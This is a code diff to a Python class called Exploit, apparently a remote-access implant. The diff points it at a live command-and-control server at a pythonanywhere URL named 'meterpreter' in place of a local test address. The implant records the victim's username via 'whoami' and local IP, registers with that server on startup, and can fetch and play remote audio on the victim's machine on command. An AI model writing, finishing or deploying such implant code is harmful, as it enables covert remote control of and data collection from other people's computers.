@@ -18,13 +18,13 @@ import io
 
 class Exploit:
     def __init__(self):
-        self.url = "http://192.168.8.113:8000" #"https://meterpreter.pythonanywhere.com/"
+        self.url = "https://meterpreter.pythonanywhere.com/"
         self.os_name = self.get_os_name()
         self.pattern = r"\s+",
         self.target = re.sub(r"\s+", "", subprocess.run('whoami',shell=True,capture_output=True,text=True).stdout)
-        self.ip = "192.168.8.113"#socket.gethostbyname(socket.gethostname())
+        self.ip = socket.gethostbyname(socket.gethostname())
         self.T = True
-        self.mixer = pygame.mixer.init()
+        self.mixer = pygame.mixer
         self.tunnel_process = None
         self.register()
 
@@ -196,10 +196,11 @@ class Exploit:
         song = self.clean_message("$play",song)
         response = requests.get(song)
         mp3_stream = io.BytesIO(response.content)
-        pygame.mixer.music.load(mp3_stream)
-        pygame.mixer.music.play()
+        self.mixer.init()
+        self.mixer.music.load(mp3_stream)
+        self.mixer.music.play()
 
     def stop_sound(self):
-        self.mixer.stop()
+        self.mixer.music.stop()
 
 Exploit().main()
